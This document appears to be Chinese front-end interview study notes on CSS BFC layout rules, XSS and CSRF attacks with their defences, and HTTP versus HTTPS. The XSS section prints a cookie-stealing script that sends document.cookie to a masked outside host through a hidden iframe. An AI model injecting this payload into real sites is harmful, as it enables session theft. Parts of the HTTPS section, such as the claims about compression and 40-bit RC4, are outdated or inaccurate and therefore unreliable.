
一.bfc相关内容
    bfc是一种布局
   BFC布局规则：
    1、内部的Box会在垂直方向，一个接一个地放置；
    2、Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠；
    3、每个元素的margin box的左边，与包含块border box的左边相接触；
    4、BFC的区域不会与float box重叠；
    5、BFC就是页面上的一个隔离的独立容器，容器里的子元素不会影响到外面的元素。反之亦如此。
    6、计算BFC的高度时，浮动元素也参与计算。

----------

    1、独立渲染区域；
    2、与这个区域外部毫不相关；
    3、需要触发（需要写一行声明，来告诉外界声明独立）
      建议使用overflow：hidden来声明
      在包住的div里触发，要触发哪一个就在哪一个地方写上overfolw:hidden


哪些元素会生产BFC？
    1、根元素
    2、float属性不为none
    3、position为absolute或fixed
    4、disply为inline-block，table-cell,table-caption,flex,inline-flex
    5、overflow不为visible

二.分别介绍XSS和CSRF攻击类型、发生场景以及防御方式

     XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
     CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

简单理解就是：
XSS： 通过客户端脚本语言（最常见如：JavaScript） 
在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！
CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。

怎么做
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://********";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);

防御方式:
       一切的一切外部来源数据，都要我们服务端代码的过滤，才能让他展示到页面上，也就是说，一切外部数据都是非法的，一定要做好过滤。
1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容 
2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤
3.在输出html时，加上Content Security Policy的Http Header 
（作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等） 
（缺陷：IE或低版本的浏览器可能不支持） 
4.在设置Cookie时，加上HttpOnly参数 
（作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6） 
（缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全） 
5.在开发API时，检验请求的Referer参数 
（作用：可以在一定程度上防止CSRF攻击） 
（缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）

三.http和https的区别是什么

  只要上过网的朋友一定接触过“HTTP”，每次开网页的时候，不管是什么网址，其前面都会出现HTTP字样，比如 “http://www.jzxue.com”、“http://62.135.5.7”等等，而有些时候打开如银行等对安全性要求很高的网站的时候其网 址的前缀又会变作“https”，这两个前缀到底是什么意思？有什么作用呢？相信很多用户朋友对此并不了解。下面就由我给大家解释一二。
      http的全称是Hypertext Transfer Protocol Vertion （超文本传输协议），说通俗点就是用网络链接传输文本信息的协议，我们现在所看的各类网页就是这个东东。每次开网页时为什么要出现“http://”呢？ 其实这个道理非常简单，因为你要获得网络上超文本信息，那么你肯定要遵循其超文本传输的规范，就如同你是“天地会”成员，你和其他“天地会”成员接头时首 先要说出“地震高岗，一派西山千古秀！”和“门朝大海，三合河水万年流”这样的接头暗号，说出后才能和会友进行沟通。所以每次开网页出现的 “http：//”就如同上面所讲的接头暗号，当暗号正确后才能获得相关信息。
      看完了上面的解释，或许你已经懂得是为什么每次开网页时要出现“http”了。那么接下来我们再谈谈为什么有时候网页的接头暗号又会变作“https”呢？
      HTTPS的全称是Secure Hypertext Transfer Protocol（安全超文本传输协议），是在http协议基础上增加了使用SSL加密传送信息的协议。我们还是用天地会接头的例子来讲，大家可能觉得每 次天地会接头都是使用“地震高岗，一派西山千古秀！”这类妇孺皆知的接头暗号，这样的组织还有什么安全性可言？只要说出了暗号那么就可能获得天地会的相关 秘密。事实上并不是这样的，如果仅仅是靠一个妇孺皆知的接头暗号进行信息保密，天地会可能早被清兵围剿了，何来那么多传奇故事呢？他们之间的交流除了使用 了接头暗号外，可能还是用了“黑话”，就是一些仅仅只有天地会成员才能听懂的黑话，这样即使天地会成员之间的交谈信息被泄露出去了，没有相关揭秘的东西， 谁也不会知道这些黑话是什么？同样HTTPS协议就如同上面天地会的信息交谈一样，它也将自己需要传输的超文本协议通过SSL加密，让明文变成了“黑话” 即使传输的信息被人捕获，捕获的人也没办法知道其实际内容。

      所以http和https之间的区别就在于其传输的内容是否加密和是否是开发性的内容。这也是你为什么常常看见https开头的网址都是一些类似银行网站的这类网址的原因。

      下面是http和https的概念

      什么是HTTPS： HTTPS（Secure Hypertext Transfer Protocol）安全超文本传输协议。
      它是一个安全通信通道，它基于HTTP开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层(SSL)进行信息交换，简单来说它是HTTP的 安全版。 它是由Netscape开发并内置于其浏览器中，用于对数据进行压缩和解压操作，并返回网络上传送回的结果。HTTPS实际上应用了Netscape的安 全全套接字层（SSL）作为HTTP应用层的子层。（HTTPS使用端口443，而不是象HTTP那样使用端口80来和TCP/IP进行通信。）SSL使 用40 位关键字作为RC4流加密算法，这对于商业信息的加密是合适的。HTTPS和SSL支持使用X.509数字认证，如果需要的话用户可以确认发送者是谁。

      HTTPS和HTTP的区别：
      1.https协议需要到ca申请证书，一般免费证书很少，需要交费。
      2.http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议。
      3.http和https使用的是完全不同的连接方式用的端口也不一样，前者是80，后者是443。
      4.http的连接很简单，是无状态的。
      5.HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。

      HTTPS解决的问题：
      1 . 信任主机的问题. 采用https 的server 必须从CA 申请一个用于证明服务器用途类型的证书. 改证书只有用于对应的server 的时候，客户度才信任次主机。所以目前所有的银行系统网站，关键部分应用都是https 的，客户通过信任该证书，从而信任了该主机，其实这样做效率很低，但是银行更侧重安全。这一点对我们没有任何意义，我们的server 采用的证书不管自己issue 还是从公众的地方issue，客户端都是自己人，所以我们也就肯定信任该server。
 
      2 . 通讯过程中的数据的泄密和被窜改
      1）一般意义上的https, 就是 server 有一个证书.
      a) 主要目的是保证server 就是他声称的server. 这个跟第一点一样.
      b) 服务端和客户端之间的所有通讯，都是加密的.
      i. 具体讲，是客户端产生一个对称的密钥，通过server 的证书来交换密钥，一般意义上的握手过程。
 
      ii. 加下来所有的信息往来就都是加密的，第三方即使截获，也没有任何意义，因为他没有密钥，当然窜改也就没有什么意义了。
 
      2）少许对客户端有要求的情况下，会要求客户端也必须有一个证书。
 
      a) 这里客户端证书，其实就类似表示个人信息的时候，除了用户名/密码， 还有一个CA 认证过的身份，个人证书一般来说上别人无法模拟的，所有这样能够更深的确认自己的身份。
 
      b) 目前少数个人银行的专业版是这种做法，具体证书可能是拿U盘作为一个备份的载体。
 

